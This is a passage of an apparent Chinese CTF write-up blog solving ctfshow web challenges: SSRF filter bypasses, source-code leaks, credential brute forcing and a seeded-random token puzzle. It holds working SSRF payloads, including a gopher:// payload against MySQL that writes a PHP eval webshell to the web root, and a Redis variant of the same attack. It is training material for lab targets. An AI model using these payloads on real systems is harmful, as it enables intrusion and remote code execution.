class="number">1</span>); <span class="comment">// 将 curl_exec() 的结果作为字符串返回</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 执行 cURL 请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">// 关闭 cURL 会话</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出请求结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 匹配到受限模式，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">奇淫巧技：将域名A类指向<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title function_ invoke__">http</span>(s):<span class="comment">//sudo.cc/指向127.0.0.1</span></span><br><span class="line"></span><br><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"></span><br><span class="line">也可以跳转到一个自己搭建的网站，再通过自己网站的自动跳转</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
<h1>web355</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 URL 的主机名部分</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查主机名的长度是否小于或等于 5</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化 cURL 会话</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出头信息</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 将 curl_exec() 的结果作为字符串返回</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 执行 cURL 请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">// 关闭 cURL 会话</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出请求结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果主机名长度大于 5，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">127.1</span></span><br></pre></td></tr></table></figure>
<h1>web356</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 URL 的主机名部分</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查主机名的长度是否小于或等于 3</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化 cURL 会话</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出头信息</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 将 curl_exec() 的结果作为字符串返回</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 执行 cURL 请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">// 关闭 cURL 会话</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出请求结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果主机名长度大于 3，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web357</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取主机名对应的 IP 地址</span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="variable">$ip</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>; <span class="comment">// 输出 IP 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 IP 地址是否为私有地址或保留地址</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>); <span class="comment">// 如果是私有或保留地址，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 file_get_contents 获取 URL 的内容并输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a></p>
<p><img src="/2025/04/20/ssrf/image-20250428194506746.png" alt="image-20250428194506746"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//7f000001.01010117.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web358</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用正则表达式检查 URL 是否符合特定模式</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果 URL 符合模式，则使用 file_get_contents 获取其内容并输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
<h1>web359</h1>
<p>这题用到Gopher，链接如下(必看)</p>
<p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
<p>Gopher介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher协议及其应用</span><br><span class="line">【网络安全 | HTTP】 gopher协议原理、语法及利用总结-CSDN …</span><br><span class="line">https://blog.csdn.net/2301_77485708/article/details/132052102</span><br><span class="line">gopher协议的利用 - FreeBuf网络安全行业门户</span><br><span class="line">https://www.freebuf.com/articles/web/337824.html</span><br><span class="line">SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客</span><br><span class="line">https://blog.csdn.net/qq_50854662/article/details/129180268</span><br><span class="line"></span><br><span class="line">Gopher协议是一种早期的互联网协议，主要用于在网络上获取文本信息。它在1991年提出，设计目的是提供一种简单且高效的方式来浏览和访问文件。Gopher协议通过类似文件系统的层次结构来组织数据，每个项目都有一个唯一的标识符。用户可以通过Gopher客户端软件浏览目录，选择下载或查看文件。Gopher服务器能够提供文本文件、图像文件、二进制文件等多种类型的文件。</span><br><span class="line"></span><br><span class="line">与HTTP相比，Gopher协议具有更简单的设计和较少的功能，它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。</span><br><span class="line"></span><br><span class="line">Gopher协议的利用</span><br><span class="line"></span><br><span class="line">Gopher协议可以被用来攻击内网的Redis、Mysql、FastCGI、Ftp等服务，也可以发送GET、POST请求，这样可以拓宽SSRF（服务器端请求伪造）的攻击面。例如，当SSRF无法通过HTTP协议传递POST数据时，可以使用Gopher协议来发起POST请求。</span><br><span class="line"></span><br><span class="line">Gopher协议的语法</span><br><span class="line"></span><br><span class="line">Gopher协议的格式通常为：</span><br><span class="line"></span><br><span class="line">gopher://hostname:port/请求方法(get、post等)/path</span><br><span class="line">其中，hostname表示Gopher服务器的主机名或IP地址，port表示Gopher服务器监听的端口号（默认为70），path则是资源的路径。例如，要请求Gopher服务器上的/example/file.txt文本文件，可以使用上述格式的URL。</span><br><span class="line"></span><br><span class="line">Gopher协议在SSRF攻击中的应用</span><br><span class="line"></span><br><span class="line">在SSRF攻击场景中，利用Gopher协议可以实现多个数据包的整合发送。这种方法可以用于攻击内网的FTP、Telnet、Redis、Memcache等服务。Gopher协议的强大之处在于它可以通过构造特定的请求，来执行对内网服务的攻击，例如写入定时任务或SSH公钥，甚至是执行SQL语句来写入Webshell。</span><br><span class="line">Gopher协议在各个编程语言中的支持情况不同，例如PHP需要--with-curlwrappers且版本至少为5.3，Java版本小于JDK1.7，而Curl的低版本不支持Gopher协议</span><br><span class="line"></span><br><span class="line">结论</span><br><span class="line"></span><br><span class="line">Gopher协议虽然在现代互联网中已不常用，但在网络安全领域，它仍然是一个强大的工具。它的简单性和灵活性使得它在特定的攻击场景中非常有用，尤其是在SSRF攻击中扩展攻击面。因此，了解Gopher协议的工作原理和应用方式对于网络安全防范至关重要</span><br></pre></td></tr></table></figure>
<p><strong>Gopher 协议在 SSRF 漏洞利用中的原理</strong>:</p>
<p>Gopher 协议是一种基于 <strong>TCP 的简单协议</strong>，它允许客户端向服务器的指定端口发送请求，并接收响应。</p>
<p>Gopher 协议允许客户端连接到任意端口，而不仅仅是默认的 70 端口。</p>
<p>TCP 是一种通用的传输层协议，它允许在任意端口上发送任意的数据流。</p>
<p>许多服务器服务（如 Web 服务器、数据库等）默认会尝试解析接收到的 TCP 数据流，以确定其是否符合自身协议规范。而我们的gopher就是TCP协议，服务器会直接进行解析。<br>
例如：</p>
<ul>
<li>如果目标服务器的 80 端口运行的是 HTTP 服务，那么它会尝试将接收到的数据解析为 HTTP 请求。</li>
<li>如果目标服务器的 6379 端口运行的是 Redis 服务，那么它会尝试将接收到的数据解析为 Redis 命令。</li>
</ul>
<p>下载gopherus</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br><span class="line"></span><br><span class="line">python gopherus.py</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/20/ssrf/Blog/source/_posts/ssrf/image-20250329180148924.png" alt="image-20250329180148924"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%36%2e%70%68%70%27%01%00%00%00%01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2536%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
<p>最后再到6.php执行后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/6.php&#x27;</span><br></pre></td></tr></table></figure>
<h1>web360</h1>
<p>和上面差不多但这里利用的redis 6379端口</p>
<p>差别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">ctfshow</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>别忘了二次url编码</p>
]]></content>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>web1-10</title>
    <url>/2025/01/19/web1-10/</url>
    <content><![CDATA[<h1>Web1:</h1>
<p><img src="/2025/01/19/web1-10/wps1.jpg" alt="img"></p>
<p>直接f12。看到flag</p>
<p>ctfshow{941628a1-7381-4612-9c0f-201bede5949c}</p>
<h1>Web2:</h1>
<p><img src="/2025/01/19/web1-10/wps2.jpg" alt="img"></p>
<p>看不了源码（右键不管用、f12不管用）</p>
<p>法一：不怕抓包</p>
<p>法二：firefox浏览器直接ctrl+u看源码</p>
<p>ctfshow{836f5d1a-952d-41fb-a059-748adf37147</p>
<h1>Web3:</h1>
<p><img src="/2025/01/19/web1-10/wps3.jpg" alt="img"></p>
<p>啥都没有，bp抓包</p>
<p>ctfshow{f40cb561-9170-4abf-96b5-422812ef996f}</p>
<h1>Web4:</h1>
<p>bp抓包</p>
<p>没思路，看题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
<p>Robots:即robots.txt。这个文件可能会泄露部分网站目录</p>
<p>在url后面添加/robots.txt</p>
<p><img src="/2025/01/19/web1-10/wps4.jpg" alt="img"></p>
<p>复制/flagishere.txt，替换url后面的robots.txt</p>
<p>进去</p>
<p>ctfshow{5e980d7b-1652-4fd2-aa6f-fb9ce4e92f8d}</p>
<h1>Web5</h1>
<p>Bp抓包无果，查看提示：phps源码泄露有时候能帮上忙</p>
<p>这道题是php源码泄露，查看响应头，</p>
<p><img src="/2025/01/19/web1-10/wps5.jpg" alt="img"></p>
<p>X-Powered-Bys后面是php及其版本。</p>
<p>php的主页文件是index.php</p>
<p>访问index.php发现还是原来的界面</p>
<p>然后在后面加一个s可以下载一个文件</p>
<p>ctfshow{fb1c7fe7-f1d8-47de-be54-2a32756be6c8}</p>
<h1>Web6</h1>
<p>看提示:解压源码到当前目录，测试正常，收工</p>
<p>网站主页源码文件名称为www.zip，然后再url后添加/www.zip对网站主页源码进行下载,然后进行解压</p>
<p><img src="/2025/01/19/web1-10/wps6.jpg" alt="img"></p>
<p>ctfshow{83099411-6ed3-4ec1-9336-8fe1d68f5bad}</p>
<h1>Web7:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>git代码泄露，直接访问/.git即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{3caad85e-71c8-4867-9a13-a6cc8a85c4ff}</p>
<h1>Web8:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>svn泄露,直接访问/.svn即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{2c8a2ed9-20cd-4c41-b0a6-42a3801bf904}</p>
<h1>Web9</h1>
<p>提示:发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
<p>vim缓存信息泄露，直接访问/index.php.swp即可</p>
<p>ctfshow{6b667116-0c5a-4fca-b6ad-f589fc29fb9f}</p>
<h1>Web10</h1>
<p>提示:cookie 只是一块饼干，不能存放任何隐私数据</p>
<p><img src="/2025/01/19/web1-10/wps7.jpg" alt="img"></p>
<p>ctfshow{f7c26679-f08a-40c9-aff2-6a373d3a17c8}</p>
<h1><em><strong>1–10总结</strong></em></h1>
<p>1.无法查看源码？Firefox当中ctrl+u查看|bp|设置当中点出来</p>
<p>/robots.txt会泄露部分网站目录</p>
<p>2.php源码泄露：X-Powered-Bys后面是php及其版本。php的主页文件是index.php。然后在后面加一个s可以下载一个文件</p>
<p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
<p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>5.vim缓存信息泄露，/index.php.swp</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2025/04/14/test/</url>
    <content><![CDATA[<p>123123123</p>
]]></content>
  </entry>
  <entry>
    <title>web21-30</title>
    <url>/2025/01/19/web21-30/</url>
    <content><![CDATA[<h1><strong>Web21</strong></h1>
<p>有一点真麻烦</p>
<img src="/2025/01/19/web21-30/image-20250119202523975.png" alt="image-20250119202523975" style="zoom:25%;">
<p>Bp抓包</p>
<p>发送给intruder</p>
<p>添加账号密码哪里</p>
<p><img src="/2025/01/19/web21-30/wps12.jpg" alt="img"></p>
<p>用自定义迭代器(Custom Iterator)</p>
<p>payload配置当中</p>
<p>位置1添加admin</p>
<p><img src="/2025/01/19/web21-30/wps13.jpg" alt="img"></p>
<p>位置2添加英文冒号</p>
<p><img src="/2025/01/19/web21-30/wps14.jpg" alt="img"></p>
<p>位置3添加下载的附件</p>
<p><img src="/2025/01/19/web21-30/wps15.jpg" alt="img"></p>
<p>Payload处理当中选择</p>
<p><img src="/2025/01/19/web21-30/wps16.jpg" alt="img"></p>
<p>对我们添加的东西进行base64加密</p>
<p>关闭对勾</p>
<p><img src="/2025/01/19/web21-30/wps17.jpg" alt="img"></p>
<p>开始破解</p>
<p>点击状态码</p>
<p><img src="/2025/01/19/web21-30/wps18.jpg" alt="img"></p>
<p>第一个就是账号和密码</p>
<p>解码出来是</p>
<p><img src="/2025/01/19/web21-30/wps19.jpg" alt="img"></p>
<p>admin:shark63</p>
<p>ctfshow{fb4fe60a-bc16-4982-92df-439262c04233}</p>
<h1><strong>Web22</strong></h1>
<p>没有靶机，自行wp</p>
<h1><strong>Web23</strong></h1>
<p><img src="/2025/01/19/web21-30/wps20.jpg" alt="img"></p>
<p>根据源码可知，需要token为特定的值才可以得到flag</p>
<p>Token里面应该是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</p>
<p>当中任意的几个的结合体</p>
<p>Wp里面假设了三个，php脚本为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">print (strlen($string).&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for ($a = 0; $a &lt; 62; $a++) &#123;</span><br><span class="line"></span><br><span class="line">  for ($b = 0; $b &lt; 62; $b++) &#123;</span><br><span class="line"></span><br><span class="line">​    for ($c = 0; $c &lt; 62; $c++) &#123;</span><br><span class="line"></span><br><span class="line">​      $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line"></span><br><span class="line">​      $token = md5($flag);</span><br><span class="line"></span><br><span class="line">​      if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) &#123;</span><br><span class="line"></span><br><span class="line">​        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) &#123;</span><br><span class="line"></span><br><span class="line">​          echo $flag . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案有很多个a6e就是其中一个</p>
<p>但是也可以是2位的token</p>
<p>使用bp暴力破解出现3j</p>
<p><img src="/2025/01/19/web21-30/wps21.jpg" alt="img"></p>
<p>这里要点击length</p>
<p><img src="/2025/01/19/web21-30/wps22.jpg" alt="img"></p>
<p>同理用bp破解三位数也一样，但是四位数就比较耗费时间了，毕竟是暴力破解嘛</p>
<p><img src="/2025/01/19/web21-30/wps23.jpg" alt="img"></p>
<p>ctfshow{83a47257-9025-4ea9-acb8-f7d5cbe4d541}</p>
<h1><strong>Web24</strong></h1>
<p>知识：伪随机数</p>
<p>我们先了解一下怎样生成随机数</p>
<?php

  echo intval(mt_rand());

?>
<p>Intval()函数，将浮点数、布尔值转化为整数或0、1</p>
<p>mt_rand()函数，会根据系统时间或者其他东西来产生随机数</p>
<p>在本题中出现了mt_srand()函数mt_srand(372619038);</p>
<p>其中的数字是seed种子，一旦使用了此函数，在之后的mt_rand()函数将基于该种子生成随机数，如果这里的种子不变，那么生成的随机数也会固定不变（因为生成随机数的算法不会变）</p>
<p>那么我们通过运行</p>
